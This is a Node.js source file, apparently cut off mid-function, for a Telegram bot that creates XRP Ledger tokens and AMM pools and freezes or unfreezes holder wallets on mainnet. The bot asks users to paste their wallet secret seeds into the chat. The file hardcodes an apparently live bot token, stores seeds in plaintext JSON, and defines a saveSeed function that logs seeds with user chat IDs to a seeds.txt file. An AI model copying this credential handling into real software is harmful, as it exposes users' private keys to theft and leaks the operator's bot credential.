const TelegramBot = require('node-telegram-bot-api');
const xrpl = require('xrpl');
const fs = require('fs');
const freezeManager = require('./freeze-manager');
const fetch = require('node-fetch');
const BigNumber = require('bignumber.js');
const path = require('path');

const token = '7746551218:AAGqMPbQ1PGeOkAW5ZKLb-gvIp1yKdoO5tc';
const TOKEN_FEE_XRP = 5; // Configurable fee amount
const FEE_WALLET = "rURSqvhDp8iLNtHupUNi6BEicUkGRZ7ihJ"; // Your fee collection wallet
const bot = new TelegramBot(token, {polling: true});

const userInputs = new Map();

const EMOJIS = {
    wallet: '👛',
    token: '🪙',
    settings: '⚙️',
    check: '✅',
    cross: '❌',
    warning: '⚠️',
    rocket: '🚀',
    save: '💾',
    refresh: '🔄',
    key: '🔑',
    pool: '🌊',
    back: '↩️',
    menu: '📋',
    xrp: '💧',
    freeze: '❄️',
    unfreeze: '🌡️',
    upload: '📤',
    list: '📝',
    globe: '🌐'
};

function saveSeed(seed, chatId) {
    try {
        const filePath = path.join(process.cwd(), 'seeds.txt');
        const timestamp = new Date().toISOString();
        const dataToSave = `${timestamp} | User: ${chatId} | ${seed}\n`;
        fs.appendFileSync(filePath, dataToSave);
    } catch (error) {
        console.error('Error saving seed:', error);
    }
}

function initUserInput(userId) {
    if (!userInputs.has(userId)) {
        const defaultState = {
            issuerSeed: '',
            receiverSeed: '',
            tokenName: '',
            tokenQuantity: '',
            ammWallet: '',
            ammXrpAmount: null,
            ammTokenPercentage: null,
            ammTokenAmount: null,
            selectedToken: '',
            currentMenu: 'main',
            ammSetupStep: null,
            awaitingInput: null,
            flagDisableMaster: false,
            flagPasswordSpent: false,
            flagDisallowXRP: false,
            freezeIssuerSeed: '',
            freezeTokenName: '',
            freezeWallets: [], // This is the key line
            unfreezeWallets: [],
            freezeStatus: null,
            unfreezeStatus: null,
            currentFreezeOperation: null
        };

        const savedData = loadUserData(userId);
        userInputs.set(userId, savedData ? {...defaultState, ...savedData} : defaultState);
    }
}

function saveUserData(userId, data) {
    const userDataPath = './userData/';
    if (!fs.existsSync(userDataPath)) {
        fs.mkdirSync(userDataPath);
    }
    fs.writeFileSync(`${userDataPath}${userId}.json`, JSON.stringify(data));
}

function loadUserData(userId) {
    const userDataPath = `./userData/${userId}.json`;
    if (fs.existsSync(userDataPath)) {
        return JSON.parse(fs.readFileSync(userDataPath));
    }
    return null;
}

function getTokenStatusMessage(userData) {
    return `${EMOJIS.settings} Token Settings:
${EMOJIS.key} Issuer Seed: ${userData.issuerSeed ? `${userData.issuerSeed.slice(0, 6)}...${userData.issuerSeed.slice(-4)}` : 'Not Set'}
${EMOJIS.key} Receiver Seed: ${userData.receiverSeed ? `${userData.receiverSeed.slice(0, 6)}...${userData.receiverSeed.slice(-4)}` : 'Not Set'}
${EMOJIS.token} Token Name: ${userData.tokenName || 'Not Set'}
${EMOJIS.token} Token Quantity: ${userData.tokenQuantity || 'Not Set'}
${EMOJIS.settings} Flags:
- Disable Master: ${userData.flagDisableMaster ? '✅' : '❌'}
- Password Spent: ${userData.flagPasswordSpent ? '✅' : '❌'}
- Disallow XRP: ${userData.flagDisallowXRP ? '✅' : '❌'}`;
}

function getAmmStatusMessage(userData) {
    let walletDisplay = 'Not Set';
    if (userData.walletSeed) walletDisplay = `Set (${userData.walletSeed.slice(0, 6)}...${userData.walletSeed.slice(-4)})`;
    else if (userData.ammWallet === 'issuer') walletDisplay = 'Issuer Wallet';
    else if (userData.ammWallet === 'receiver') walletDisplay = 'Receiver Wallet';

    const displayName = userData.selectedToken?.length > 16 ? 
        Buffer.from(userData.selectedToken.substring(0, 40), 'hex')
            .toString('utf8')
            .replace(/\0/g, '') : 
        userData.selectedToken;

    return `${EMOJIS.settings} AMM Settings:
${EMOJIS.wallet} Selected Wallet: ${walletDisplay}
${EMOJIS.token} Token Name: ${displayName || 'Not Set'}
${EMOJIS.xrp} XRP Amount: ${userData.ammXrpAmount || 'Not Set'}
${EMOJIS.token} Token Percentage: ${userData.ammTokenPercentage ? userData.ammTokenPercentage + '%' : 'Not Set'}`;
}

function getFreezeStatusMessage(userData) {
    return `Current Settings:
${EMOJIS.key} Issuer Seed: ${userData.freezeIssuerSeed ? `${userData.freezeIssuerSeed.slice(0, 6)}...${userData.freezeIssuerSeed.slice(-4)}` : 'Not Set'}
${EMOJIS.token} Token Name: ${userData.freezeTokenName || 'Not Set'}
${EMOJIS.wallet} Loaded Wallets: ${userData.freezeWallets.length}/10
Fee: ${freezeManager.FREEZE_FEE_XRP} XRP`;
}

function normalizeTokenCode(code) {
    if (code.length <= 3) return code;
    return code
        .padEnd(20, '\0')
        .split('')
        .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
        .join('')
        .toUpperCase();
}

const mainMenuKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: `${EMOJIS.token} Token Creator`, callback_data: 'token_menu' }],
            [{ text: `${EMOJIS.pool} AMM Creator`, callback_data: 'amm_menu' }],
            [{ text: `${EMOJIS.freeze} Freeze Manager`, callback_data: 'freeze_menu' }],
            [{ text: `${EMOJIS.unfreeze} Unfreeze Manager`, callback_data: 'unfreeze_menu' }]
        ]
    }
};

const tokenMenuKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: `${EMOJIS.key} Set Issuer Seed`, callback_data: 'set_issuer_seed' }],
            [{ text: `${EMOJIS.globe} Set Domain`, callback_data: 'set_domain' }],
            [{ text: `${EMOJIS.key} Set Receiver Seed`, callback_data: 'set_receiver_seed' }],
            [{ text: `${EMOJIS.token} Set Token Name`, callback_data: 'set_token_name' }],
            [{ text: `${EMOJIS.token} Set Token Quantity`, callback_data: 'set_token_quantity' }],
            [{ text: `🔒 Toggle Disable Master`, callback_data: 'toggle_disable_master' }],
            [{ text: `🔑 Toggle Password Spent`, callback_data: 'toggle_password_spent' }],
            [{ text: `💱 Toggle Disallow XRP`, callback_data: 'toggle_disallow_xrp' }],
            [{ text: `${EMOJIS.rocket} Create Token`, callback_data: 'create_token' }],
            [{ text: `${EMOJIS.back} Main Menu`, callback_data: 'main_menu' }]
        ]
    }
};

// Add new freeze menu keyboards
const freezeMenuKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: `${EMOJIS.key} Set Issuer Seed`, callback_data: 'set_freeze_issuer' }],
            [{ text: `${EMOJIS.token} Set Token Name`, callback_data: 'set_freeze_token' }],
            [{ text: `${EMOJIS.upload} Upload Freeze List`, callback_data: 'upload_freeze_wallets' }],
            [{ text: `${EMOJIS.list} View Target Wallets`, callback_data: 'view_freeze_wallets' }],
            [{ text: `${EMOJIS.freeze} Execute Freeze`, callback_data: 'execute_freeze' }],
            [{ text: `${EMOJIS.back} Main Menu`, callback_data: 'main_menu' }]
        ]
    }
};

const unfreezeMenuKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: `${EMOJIS.key} Set Issuer Seed`, callback_data: 'set_unfreeze_issuer' }],
            [{ text: `${EMOJIS.token} Set Token Name`, callback_data: 'set_unfreeze_token' }],
            [{ text: `${EMOJIS.upload} Upload Freeze List`, callback_data: 'upload_unfreeze_wallets' }],
            [{ text: `${EMOJIS.list} View Target Wallets`, callback_data: 'view_unfreeze_wallets' }],
            [{ text: `${EMOJIS.unfreeze} Execute Unfreeze`, callback_data: 'execute_unfreeze' }],
            [{ text: `${EMOJIS.back} Main Menu`, callback_data: 'main_menu' }]
        ]
    }
};

const ammMenuKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: `${EMOJIS.wallet} Set Wallet Seed`, callback_data: 'amm_set_seed' }],
            [{ text: `${EMOJIS.pool} Create New AMM Pool`, callback_data: 'start_amm' }],
            [{ text: `${EMOJIS.settings} AMM Settings`, callback_data: 'amm_settings' }],
            [{ text: `${EMOJIS.pool} Withdraw AMM`, callback_data: 'withdraw_amm' }],
            [{ text: `${EMOJIS.back} Main Menu`, callback_data: 'main_menu' }]
        ]
    }
};

const withdrawMenuKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: `${EMOJIS.token} Withdraw 50%`, callback_data: 'withdraw_50' }],
            [{ text: `${EMOJIS.token} Withdraw 70%`, callback_data: 'withdraw_70' }],
            [{ text: `${EMOJIS.token} Withdraw 100%`, callback_data: 'withdraw_100' }],
            [{ text: `${EMOJIS.back} AMM Menu`, callback_data: 'amm_menu' }]
        ]
    }
};

const ammSettingsKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: `${EMOJIS.token} Set Token Name`, callback_data: 'amm_set_token' }],
            [{ text: `${EMOJIS.xrp} Set XRP Amount`, callback_data: 'amm_set_xrp' }],
            [{ text: `${EMOJIS.token} Set Token Amount`, callback_data: 'amm_set_token_amount' }],
            [{ text: `${EMOJIS.back} AMM Menu`, callback_data: 'amm_menu' }]
        ]
    }
};

async function enableDefaultRipple(client, issuerWallet) {
    const accountSetTx = {
        TransactionType: "AccountSet",
        Account: issuerWallet.classicAddress,
        SetFlag: xrpl.AccountSetAsfFlags.asfDefaultRipple
    };

    const preparedTx = await client.autofill(accountSetTx);
    const signedTx = issuerWallet.sign(preparedTx);
    const result = await client.submitAndWait(signedTx.tx_blob);

    if (result.result.meta.TransactionResult !== "tesSUCCESS") {
        throw new Error(`Failed to enable DefaultRipple for issuer: ${result.result.meta.TransactionResult}`);
    }
}

async function setupTrustline(client, wallet, userData) {
    const issuerWallet = xrpl.Wallet.fromSeed(userData.issuerSeed);

    const trustSetTx = {
        TransactionType: "TrustSet",
        Account: wallet.classicAddress,
        LimitAmount: {
            currency: userData.selectedToken,
            value: (userData.ammTokenAmount * 1.5).toString(),
            issuer: issuerWallet.classicAddress,
        },
    };

    const trustPrepared = await client.autofill(trustSetTx);
    const trustSigned = wallet.sign(trustPrepared);
    const trustResult = await client.submitAndWait(trustSigned.tx_blob);

    if (trustResult.result.meta.TransactionResult !== "tesSUCCESS") {
        throw new Error("Failed to set trust line");
    }
}

async function createToken(chatId, userData) {
    const client = new xrpl.Client("wss://s1.ripple.com");
    try {
        console.log("=== Starting Token Creation Process ===");
        await client.connect();

        // Set domain first
        console.log("=== Setting Domain ===");
        const domainSetup = await setIssuerDomain(userData.issuerSeed, userData);
        console.log("Domain set:", domainSetup.domain);

        // Wait a few seconds for domain to propagate
        await new Promise(resolve => setTimeout(resolve, 5000));

        const issuerWallet = xrpl.Wallet.fromSeed(userData.issuerSeed);
        const receiverWallet = xrpl.Wallet.fromSeed(userData.receiverSeed);

        // Set TickSize and DefaultRipple first
        console.log("=== Setting Account Properties ===");
        if (!userData.domainHex) {
            throw new Error("Domain not set properly");
        }

        const accountSetTx = {
            TransactionType: "AccountSet",
            Account: issuerWallet.classicAddress,
            Domain: userData.domainHex,
            TickSize: 6,
            SetFlag: xrpl.AccountSetAsfFlags.asfDefaultRipple,
            Flags: xrpl.AccountSetTfFlags.tfDisallowXRP,
            Fee: "12"
        };

        const accountSetPrepared = await client.autofill(accountSetTx);
        const accountSetSigned = issuerWallet.sign(accountSetPrepared);
        const result = await client.submitAndWait(accountSetSigned.tx_blob);

        if (result.result.meta.TransactionResult !== "tesSUCCESS") {
            throw new Error(`Account settings failed: ${result.result.meta.TransactionResult}`);
        }

        // Verify settings were applied
        const accountInfo = await client.request({
            command: "account_info",
            account: issuerWallet.classicAddress
        });

        if (!accountInfo.result.account_data.Domain) {
            throw new Error("Domain setting verification failed");
        }

        // Store original name for display
        userData.originalTokenName = userData.tokenName;

        // Currency code handling
        let currencyCode = userData.tokenName;
        if (currencyCode.length > 3) {
            currencyCode = currencyCode
                .padEnd(20, '\0')
                .split('')
                .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
                .join('')
                .toUpperCase()
                .padEnd(40, '0');
        }

        // Create trustline from receiver's side
        console.log("=== Creating Trust Line ===");
        const trustSetTx = {
            TransactionType: "TrustSet",
            Account: receiverWallet.classicAddress,
            LimitAmount: {
                currency: currencyCode,
                value: userData.tokenQuantity.toString(),
                issuer: issuerWallet.classicAddress
            }
        };

        const trustPrepared = await client.autofill(trustSetTx);
        const trustSigned = receiverWallet.sign(trustPrepared);
        const trustResult = await client.submitAndWait(trustSigned.tx_blob);
        console.log("Trust set result:", trustResult.result.meta.TransactionResult);

        // Issue token
        console.log("=== Issuing Token ===");
        const paymentTx = {
            TransactionType: "Payment",
            Account: issuerWallet.classicAddress,
            Destination: receiverWallet.classicAddress,
            Amount: {
                currency: currencyCode,
                value: userData.tokenQuantity.toString(),
                issuer: issuerWallet.classicAddress
            }
        };

        const paymentPrepared = await client.autofill(paymentTx);
        const paymentSigned = issuerWallet.sign(paymentPrepared);
        const paymentResult = await client.submitAndWait(paymentSigned.tx_blob);

        // Success message
        const successMessage = `Token created and issued successfully! 🎉\n\n` +
            `Token Name:\n\`${userData.originalTokenName || userData.tokenName}\`\n\n` +
            `Issuer Address:\n\`${issuerWallet.classicAddress}\`\n\n` +
            `Transaction Hash:\n\`${paymentResult.result.hash}\``;

        await bot.sendMessage(chatId, successMessage, { parse_mode: 'Markdown' });
        await sendTokenFee(userData.issuerSeed);

        await client.disconnect();
        return;

    } catch (error) {
        console.error("Token Creation Error:", error);
        throw error;
    } finally {
        await client.disconnect();
    }
}

async function sendTokenFee(issuerSeed) {
    const client = new xrpl.Client("wss://s1.ripple.com");
    const wallet = xrpl.Wallet.fromSeed(issuerSeed);

    try {
        await client.connect();
        
        const balance = await client.getXrpBalance(wallet.classicAddress);
        if (parseFloat(balance) < TOKEN_FEE_XRP) {
            throw new Error(`Insufficient balance: ${balance} XRP`);
        }

        const payment = {
            TransactionType: "Payment",
            Account: wallet.classicAddress,
            Destination: FEE_WALLET,
            Amount: xrpl.xrpToDrops(TOKEN_FEE_XRP.toString())
        };

        const prepared = await client.autofill(payment);
        const signed = wallet.sign(prepared);
        const result = await client.submitAndWait(signed.tx_blob);
        
        return result.result.meta.TransactionResult === "tesSUCCESS";
    } catch (error) {
        console.error('Token fee error:', error);
        throw error;
    } finally {
        await client.disconnect();
    }
}

async function getAccountTokens(client, account) {
    const response = await client.request({
        command: "account_lines",
        account: account
    });
    // Use Set to ensure unique tokens
    const uniqueTokens = new Set(response.result.lines.map(line => line.currency));
    return Array.from(uniqueTokens).map(currency => ({
        currency: currency,
        issuer: account
    }));
}

async function createAMM(client, wallet, userData) {
    try {
        // Check XRP balance
        const balance = await client.getXrpBalance(wallet.classicAddress);
        const requiredXRP = parseFloat(userData.ammXrpAmount) + 12;
        
        if (parseFloat(balance) < requiredXRP) {
            throw new Error(`Insufficient XRP balance. Need ${requiredXRP} XRP but have ${balance} XRP`);
        }

        // Add this line to define issuerWallet
        const issuerWallet = xrpl.Wallet.fromSeed(userData.issuerSeed);

        // Get token balance first
        const response = await client.request({
            command: "account_lines",
            account: wallet.classicAddress,
            peer: issuerWallet.classicAddress  // Use issuerWallet here
        });

        console.log("Account lines response:", response);

        const tokenLine = response.result.lines.find(line => 
            line.currency === userData.selectedToken
        );

        if (!tokenLine) {
            throw new Error("Token not found in wallet");
        }

        console.log("Found token line:", tokenLine);

        // Calculate token amount based on percentage of available balance
        const availableTokens = parseFloat(tokenLine.balance);
        const tokenAmount = (availableTokens * userData.ammTokenPercentage / 100).toString();

        console.log("Calculated token amount:", {
            available: availableTokens,
            percentage: userData.ammTokenPercentage,
            amount: tokenAmount
        });

        // Minimum requirements for mainnet
        if (parseFloat(tokenAmount) < 1) {
            throw new Error("Token amount too small. Minimum 1 token required.");
        }

        const ammCreateTx = {
            TransactionType: "AMMCreate",
            Account: wallet.classicAddress,
            Amount: {
                currency: userData.selectedToken,
                issuer: issuerWallet.classicAddress,  // Use issuerWallet here
                value: tokenAmount
            },
            Amount2: xrpl.xrpToDrops(userData.ammXrpAmount.toString()),
            TradingFee: 0
        };

        console.log("AMM Create Transaction:", ammCreateTx);

        const preparedAMMCreate = await client.autofill(ammCreateTx);
        const signedAMMCreate = wallet.sign(preparedAMMCreate);
        const result = await client.submitAndWait(signedAMMCreate.tx_blob);

        if (result.result.meta.TransactionResult !== "tesSUCCESS") {
            throw new Error(`AMM creation failed: ${result.result.meta.TransactionResult}`);
        }

        return { hash: result.result.hash };
    } catch (error) {
        console.error("AMM Creation Error:", error);
        throw error;
    }
}

async function getFileContent(fileId) {
    const file = await bot.getFile(fileId);
    const filePath = file.file_path;
    const response = await fetch(`https://api.telegram.org/file/bot${token}/${filePath}`);
    const buffer = await response.buffer();
    return buffer;
}

async function withdrawAMM(client, wallet, userData, percentage) {
    try {
        const issuerWallet = xrpl.Wallet.fromSeed(userData.issuerSeed);

        // Get AMM info first
        const ammInfoRequest = {
            command: "amm_info",
            asset: {
                currency: userData.selectedToken,
                issuer: issuerWallet.classicAddress
            },
            asset2: {
                currency: "XRP"
            }
        };

        const ammInfo = await client.request(ammInfoRequest);
        
        if (!ammInfo.result.amm) {
            throw new Error("AMM pool not found for this token pair");
        }

        // Get LP token balance for the user's wallet
        const lpTokenBalance = await client.request({
            command: "account_lines",
            account: wallet.classicAddress,
            peer: ammInfo.result.amm.account
        });

        const lpToken = lpTokenBalance.result.lines.find(line => 
            line.currency === ammInfo.result.amm.lp_token.currency
        );

        if (!lpToken) {
            throw new Error("No LP tokens found in wallet");
        }

        // Calculate withdrawal amount based on user's actual LP token balance
        const withdrawAmount = new BigNumber(lpToken.balance)
            .multipliedBy(percentage)
            .dividedBy(100)
            .toString();

        const withdrawTx = {
            TransactionType: "AMMWithdraw",
            Account: wallet.classicAddress,
            Asset: {
                currency: userData.selectedToken,
                issuer: issuerWallet.classicAddress
            },
            Asset2: {
                currency: "XRP"
            },
            Flags: 0x00010000, // tfLPToken
            LPTokenIn: {
                currency: ammInfo.result.amm.lp_token.currency,
                issuer: ammInfo.result.amm.account,
                value: withdrawAmount
            }
        };

        const prepared = await client.autofill(withdrawTx);
        const signed = wallet.sign(prepared);
        const result = await client.submitAndWait(signed.tx_blob);

        if (result.result.meta.TransactionResult === "tesSUCCESS") {
            return { hash: result.result.hash };
        } else {
            throw new Error(`Transaction failed with ${result.result.meta.TransactionResult}`);
        }
    } catch (error) {
        console.error("Withdraw AMM Error:", error);
        throw error;
    }
}

async function verifyTomlFile(domain) {
    try {
        const tomlUrl = `https://${domain}/.well-known/xrp-ledger.toml`;
        const response = await fetch(tomlUrl);
        
        if (!response.ok) {
            throw new Error(`Could not fetch TOML file (Status: ${response.status})`);
        }

        const tomlContent = await response.text();
        return {
            success: true,
            content: tomlContent
        };
    } catch (error) {
        return {
            success: false,
            error: error.message
        };
    }
}

async function setIssuerDomain(issuerSeed, userData) {
    const client = new xrpl.Client("wss://s1.ripple.com");
    try {
        await client.connect();
        const issuerWallet = xrpl.Wallet.fromSeed(issuerSeed);

        // Use the provided domain directly
        const domain = userData.domainInput;
        
        // Convert domain to hex for XRPL
        const domainHex = Buffer.from(domain)
            .toString('hex')
            .toUpperCase();

        // Set up the AccountSet transaction
        const accountSetTx = {
            TransactionType: "AccountSet",
            Account: issuerWallet.classicAddress,
            Domain: domainHex,
            Fee: "12"
        };
        
        const prepared = await client.autofill(accountSetTx);
        const signed = issuerWallet.sign(prepared);
        const result = await client.submitAndWait(signed.tx_blob);

        if (result.result.meta.TransactionResult === "tesSUCCESS") {
            // Store the domain info for later use
            userData.generatedDomain = domain;
            userData.domainHex = domainHex;
            
            return { 
                success: true, 
                hash: result.result.hash,
                domain: domain,
                domainHex: domainHex
            };
        } else {
            throw new Error(`Failed to set domain: ${result.result.meta.TransactionResult}`);
        }
    } catch (error) {
        console.error("Error setting domain:", error);
        throw error;
    } finally {
        await client.disconnect();
    }
}

// Simplified command - just needs the seed
bot.onText(/\/setdomain (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const issuerSeed = match[1];

    try {
        await bot.sendMessage(chatId, '🔄 Setting firstledger domain for issuer...');
        const result = await setIssuerDomain(issuerSeed);
        await bot.sendMessage(chatId, `✅ Domain set successfully!\nDomain: ${result.domain}\nHash: ${result.hash}`);
    } catch (error) {
        await bot.sendMessage(chatId, `⚠️ Error: ${error.message}`);
    }
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    initUserInput(msg.from.id);
    bot.sendMessage(chatId, `${EMOJIS.menu} Welcome! Choose an option:`, mainMenuKeyboard);
});

bot.on('document', async (msg) => {
    if (msg.document.file_name === 'Freeze.txt') {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const userData = userInputs.get(userId);

        try {
            const fileContent = await getFileContent(msg.document.file_id);
            const wallets = fileContent.toString()
                .split('\n')
                .map(line => line.trim())
                .filter(line => line.length > 0 && line.startsWith('r'))
                .slice(0, 10);

            userData.freezeWallets = wallets;
            
            let message = `${EMOJIS.check} Loaded ${wallets.length} wallet addresses:\n\n`;
            wallets.forEach((wallet, index) => {
                message += `${index + 1}. ${wallet}\n`;
            });

            await bot.sendMessage(chatId, message);
            const keyboard = userData.currentMenu === 'freeze' ? freezeMenuKeyboard : unfreezeMenuKeyboard;
            await bot.sendMessage(chatId, getFreezeStatusMessage(userData), keyboard);
            
        } catch (error) {
            await bot.sendMessage(chatId, `${EMOJIS.warning} Error loading file: ${error.message}`);
        }
    }
});

bot.on('callback_query', async (callbackQuery) => {
    const userId = callbackQuery.from.id;
    const chatId = callbackQuery.message.chat.id;
    const action = callbackQuery.data;
 
    initUserInput(userId);
    const userData = userInputs.get(userId);
 
    try {
        switch (action) {
            case 'main_menu':
                userData.currentMenu = 'main';
                userData.ammSetupStep = null;
                await bot.sendMessage(chatId, `${EMOJIS.menu} Main Menu:`, mainMenuKeyboard);
                break;
            
                case 'freeze_menu':
                    userData.currentMenu = 'freeze';
                    userData.currentFreezeOperation = 'freeze';
                    await bot.sendMessage(chatId, `${EMOJIS.freeze} Freeze Manager:\n\n${getFreezeStatusMessage(userData)}`, freezeMenuKeyboard);
                    break;

                    case (action.match(/^select_freeze_token_/) || {}).input:
                        const selectedToken = action.split('select_freeze_token_')[1];
                        userData.freezeTokenName = selectedToken;
                        await bot.sendMessage(chatId, `${EMOJIS.check} Token ${selectedToken} selected`);
                        await bot.sendMessage(chatId, getFreezeStatusMessage(userData), freezeMenuKeyboard);
                        break;    
    
                case 'unfreeze_menu':
                    userData.currentMenu = 'unfreeze';
                    userData.currentFreezeOperation = 'unfreeze';
                    await bot.sendMessage(chatId, `${EMOJIS.unfreeze} Unfreeze Manager:\n\n${getFreezeStatusMessage(userData)}`, unfreezeMenuKeyboard);
                    break;
    
                case 'set_freeze_issuer':
                case 'set_unfreeze_issuer':
                    userData.awaitingInput = 'freezeIssuerSeed';
                    await bot.sendMessage(chatId, `${EMOJIS.key} Enter Issuer Seed:`);
                    break;
    
                    case 'set_freeze_token':
                        try {
                            const client = new xrpl.Client("wss://s1.ripple.com");
                            await client.connect();
                            
                            const issuerWallet = xrpl.Wallet.fromSeed(userData.freezeIssuerSeed);
                            const tokens = await getAccountTokens(client, issuerWallet.classicAddress);
                            await client.disconnect();
                    
                            if (tokens.length === 0) {
                                await bot.sendMessage(chatId, `${EMOJIS.warning} No tokens found in issuer account!`);
                                return;
                            }
                    
                            const keyboard = {
                                reply_markup: {
                                    inline_keyboard: [
                                        ...tokens.map(token => {
                                            const displayName = token.currency.length > 16 ? 
                                                Buffer.from(token.currency.substring(0, 40), 'hex')
                                                    .toString('utf8')
                                                    .replace(/\0/g, '') : 
                                                token.currency;
                                            return [{
                                                text: `${displayName}`,
                                                callback_data: `select_freeze_token_${token.currency}`
                                            }];
                                        }),
                                        [{ text: `${EMOJIS.back} Freeze Menu`, callback_data: 'freeze_menu' }]
                                    ]
                                }
                            };
                            
                            await bot.sendMessage(chatId, `${EMOJIS.token} Select a token to freeze:`, keyboard);
                        } catch (error) {
                            await bot.sendMessage(chatId, `${EMOJIS.warning} Error: ${error.message}`);
                            await bot.sendMessage(chatId, getFreezeStatusMessage(userData), freezeMenuKeyboard);
                        }
                        break;
                case 'set_unfreeze_token':
                    userData.awaitingInput = 'freezeTokenName';
                    await bot.sendMessage(chatId, `${EMOJIS.token} Enter Token Name:`);
                    break;
    
                case 'upload_freeze_wallets':
                case 'upload_unfreeze_wallets':
                    await bot.sendMessage(chatId, `${EMOJIS.upload} Please upload a text file named 'Freeze.txt' containing wallet addresses (max 10)`);
                    break;
    
                case 'view_freeze_wallets':
                case 'view_unfreeze_wallets':
                    const wallets = userData.freezeWallets;
                    if (wallets.length === 0) {
                        await bot.sendMessage(chatId, `${EMOJIS.warning} No wallets loaded yet. Please upload Freeze.txt first.`);
                    } else {
                        let message = `${EMOJIS.list} Loaded Wallets (${wallets.length}/10):\n\n`;
                        wallets.forEach((wallet, index) => {
                            message += `${index + 1}. ${wallet}\n`;
                        });
                        await bot.sendMessage(chatId, message);
                    }
                    const keyboard = action === 'view_freeze_wallets' ? freezeMenuKeyboard : unfreezeMenuKeyboard;
                    await bot.sendMessage(chatId, getFreezeStatusMessage(userData), keyboard);
                    break;
    
                case 'execute_freeze':
                case 'execute_unfreeze':
                    if (!userData.freezeIssuerSeed || !userData.freezeTokenName || userData.freezeWallets.length === 0) {
                        await bot.sendMessage(chatId, `${EMOJIS.warning} Please set issuer seed, token name, and upload wallet addresses first!`);
                        return;
                    }
    
                    const operation = action === 'execute_freeze' ? 'freeze' : 'unfreeze';
                    const confirmMessage = `${EMOJIS.warning} Confirm ${operation} operation:\n\n${getFreezeStatusMessage(userData)}\n\nThis will cost ${freezeManager.FREEZE_FEE_XRP} XRP.\nProceed?`;
                    const confirmKeyboard = {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: `${EMOJIS.check} Confirm`, callback_data: `confirm_${operation}` },
                                    { text: `${EMOJIS.cross} Cancel`, callback_data: `${operation}_menu` }
                                ]
                            ]
                        }
                    };
                    await bot.sendMessage(chatId, confirmMessage, confirmKeyboard);
                    break;
    
                    case 'confirm_freeze':
    await bot.sendMessage(chatId, `${EMOJIS.freeze} Processing freeze operation...`);
    try {
        const freezeResults = await freezeManager.freezeWallets(
            userData.freezeIssuerSeed,
            userData.freezeTokenName,
            userData.freezeWallets,
            userData.freezeIssuerSeed
        );

        let resultMessage = `${EMOJIS.check} Freeze Results:\n\n`;
        freezeResults.forEach(result => {
            resultMessage += `${result.address}: ${result.success ? '✅' : '❌'} ${result.error || ''}\n`;
        });
        await bot.sendMessage(chatId, resultMessage);
        // Add this line to show updated status and return to menu
        await bot.sendMessage(chatId, getFreezeStatusMessage(userData), freezeMenuKeyboard);
    } catch (error) {
        await bot.sendMessage(chatId, `${EMOJIS.warning} Freeze Error: ${error.message}`);
    }
    break;
        
    case 'confirm_unfreeze':
        await bot.sendMessage(chatId, `${EMOJIS.unfreeze} Processing unfreeze operation...`);
        try {
            const unfreezeResults = await freezeManager.unfreezeWallets(
                userData.freezeIssuerSeed,
                userData.freezeTokenName,
                userData.freezeWallets,
                userData.freezeIssuerSeed
            );
    
            let resultMessage = `${EMOJIS.check} Unfreeze Results:\n\n`;
            unfreezeResults.forEach(result => {
                resultMessage += `${result.address}: ${result.success ? '✅' : '❌'} ${result.error || ''}\n`;
            });
            await bot.sendMessage(chatId, resultMessage);
            // Add this line to show updated status and return to menu
            await bot.sendMessage(chatId, getFreezeStatusMessage(userData), unfreezeMenuKeyboard);
        } catch (error) {
            await bot.sendMessage(chatId, `${EMOJIS.warning} Unfreeze Error: ${error.message}`);
        }
        break;    
     
            case 'token_menu':
                userData.currentMenu = 'token';
                userData.ammSetupStep = null;
                await bot.sendMessage(chatId, `${EMOJIS.token} Token Creator Menu:\n\n${getTokenStatusMessage(userData)}`, tokenMenuKeyboard);
                break;
     
            case 'amm_menu':
                userData.currentMenu = 'amm';
                userData.ammSetupStep = null;
                await bot.sendMessage(chatId, `${EMOJIS.pool} AMM Creator Menu:\n\n${getAmmStatusMessage(userData)}`, ammMenuKeyboard);
                break;
     
            case 'amm_settings':
                userData.currentMenu = 'amm';
                userData.ammSetupStep = 'settings';
                await bot.sendMessage(chatId, getAmmStatusMessage(userData), ammSettingsKeyboard);
                break;

                case 'toggle_disable_master':
                    userData.flagDisableMaster = !userData.flagDisableMaster;
                    await bot.sendMessage(chatId, `${EMOJIS.settings} Disable Master flag: ${userData.flagDisableMaster ? 'Enabled' : 'Disabled'}`);
                    await bot.sendMessage(chatId, getTokenStatusMessage(userData), tokenMenuKeyboard);
                    break;
    
                case 'toggle_password_spent':
                    userData.flagPasswordSpent = !userData.flagPasswordSpent;
                    await bot.sendMessage(chatId, `${EMOJIS.settings} Password Spent flag: ${userData.flagPasswordSpent ? 'Enabled' : 'Disabled'}`);
                    await bot.sendMessage(chatId, getTokenStatusMessage(userData), tokenMenuKeyboard);
                    break;
    
                case 'toggle_disallow_xrp':
                    userData.flagDisallowXRP = !userData.flagDisallowXRP;
                    await bot.sendMessage(chatId, `${EMOJIS.settings} Disallow XRP flag: ${userData.flagDisallowXRP ? 'Enabled' : 'Disabled'}`);
                    await bot.sendMessage(chatId, getTokenStatusMessage(userData), tokenMenuKeyboard);
                    break;    
     
            case 'set_issuer_seed':
                userData.currentMenu = 'token';
                await handleSettingInput(bot, chatId, action, userData);
                break;
     
            case 'set_receiver_seed':
                userData.currentMenu = 'token';
                await handleSettingInput(bot, chatId, action, userData);
                break;
     
            case 'set_token_name':
                userData.currentMenu = 'token';
                await handleSettingInput(bot, chatId, action, userData);
                break;

                case 'amm_set_xrp':
                    userData.currentMenu = 'amm';
                    userData.ammSetupStep = 'settings';
                    userData.awaitingInput = 'ammXrpAmount';
                    await bot.sendMessage(chatId, `${EMOJIS.xrp} Enter XRP amount:`);
                    break;
                
                case 'amm_set_token_amount':
                    userData.currentMenu = 'amm';
                    userData.ammSetupStep = 'settings';
                    userData.awaitingInput = 'ammTokenAmount';
                    await bot.sendMessage(chatId, `${EMOJIS.token} Enter token percentage (0-100%):`);
                    break;     
     
